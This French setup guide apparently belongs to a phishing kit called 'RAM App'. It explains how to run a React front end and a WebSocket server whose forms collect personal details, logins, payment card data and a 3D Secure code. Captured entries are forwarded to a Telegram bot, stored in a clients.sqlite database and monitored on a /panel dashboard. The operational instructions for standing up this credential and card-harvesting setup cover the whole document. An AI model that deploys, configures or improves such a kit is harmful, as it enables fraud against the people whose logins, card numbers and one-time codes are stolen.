# 🚀 Guide de Test Local - RAM App

## 📋 Prérequis
- Node.js (version 18+)
- npm
- Bot Telegram configuré

## ⚙️ Configuration

### 1. Créer le fichier .env pour le client

Dans le dossier `ram-app/client/`, créez un fichier `.env` :

```bash
cd ram-app/client
touch .env
```

Ajoutez ces lignes dans `.env` :

```env
VITE_TELEGRAM_TOKEN=votre_token_bot_telegram
VITE_TELEGRAM_CHAT_ID=votre_chat_id_telegram
VITE_WS_HOST=localhost:8090
```

**Comment obtenir un bot Telegram :**
1. Cherchez `@BotFather` sur Telegram → `/newbot` → copiez le token
2. Cherchez `@userinfobot` sur Telegram → envoyez un message → copiez votre Chat ID

## 🏃 Démarrer le projet

### Terminal 1 - Serveur WebSocket
```bash
cd ram-app/server
node index.js
```
✅ Le serveur démarre sur le port **8090**

### Terminal 2 - Client React
```bash
cd ram-app/client
npm install  # Si pas encore fait
npm run dev
```
✅ Le client démarre sur **http://localhost:3002**

## 🧪 Tester

1. Ouvrez **http://localhost:3002/** dans votre navigateur
2. Remplissez les formulaires :
   - Your informations → Login → Payment details → 3D Secure → Complete
3. Vérifiez les messages dans Telegram
4. Ouvrez **http://localhost:3002/panel** pour voir le Dashboard

## 🔍 Vérification

- ✅ WebSocket : `ws://localhost:8090`
- ✅ Client : `http://localhost:3002`
- ✅ Dashboard : `http://localhost:3002/panel`
- ✅ Base de données : `ram-app/server/clients.sqlite`

## 🐛 Dépannage

**WebSocket ne se connecte pas ?**
→ Vérifiez que le serveur tourne sur le port 8090

**Messages Telegram ne partent pas ?**
→ Vérifiez le fichier `.env` avec les bonnes valeurs

**Erreurs npm ?**
→ Exécutez `npm install` dans `ram-app/client` et `ram-app/server`
